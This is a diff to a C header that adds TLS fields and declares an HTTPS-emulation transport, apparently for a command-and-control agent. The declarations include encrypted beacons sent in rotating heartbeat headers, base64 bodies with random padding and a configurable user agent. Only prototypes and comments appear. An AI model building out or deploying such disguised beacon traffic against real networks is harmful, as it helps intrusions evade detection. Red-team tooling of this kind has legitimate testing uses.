@@ -32,7 +32,9 @@ typedef struct {
     ws_state_t state;   ///< Connection state
     char* host;         ///< Currently connected host (for Host header)
     uint16_t port;      ///< Currently connected port
-    int use_ssl;        ///< Whether TLS was requested (not yet supported in nostdlib mode)
+    int use_ssl;        ///< Whether TLS was requested
+    int tls_active;     ///< TLS handshake completed (mbedtls embedded)
+    void* tls;          ///< ws_tls_t* (mbedtls ssl/config/entropy/rng blob), opaque here
 } ws_connector_t;
 
 /// Initialize WS connector
@@ -74,5 +76,22 @@ int ws_b64_decode(const char* in, size_t in_len, uint8_t* out, size_t out_cap);
 int ws_build_beat(const uint8_t* enc_key, uint32_t agent_type, uint32_t agent_id,
                   const uint8_t* session_info, size_t si_len,
                   uint8_t* beat_buf, size_t beat_cap, size_t* beat_out_len);
+
+// ── HTTPS-emulation transport (H1 Phase 1b, https_emu.c) ──
+// TCP connect (+ embedded TLS when use_ssl). Reuses ws_connector_t plumbing.
+int https_connect(ws_connector_t* ws, const char* host, uint16_t port, int use_ssl);
+
+// POST a payload: body = b64(data) + random '\n' padding, beat in hb_header.
+// Returns 0 on success, -1 on failure.
+int https_send(ws_connector_t* ws, const char* uri, const char* user_agent,
+               const char* hb_header_name, const char* beat,
+               const uint8_t* data, size_t len);
+
+// Read an HTTP response body (headers then Content-Length bytes).
+// Allocates *out_data (caller frees). Returns 0 on success, -1 on failure.
+int https_recv(ws_connector_t* ws, uint8_t** out_data, size_t* out_len);
+
+// Rotate across a comma-separated heartbeat-header list (static buffer).
+const char* https_pick_header(const char* list, uint32_t idx);
 
 #endif /* WS_CONNECTOR_H */
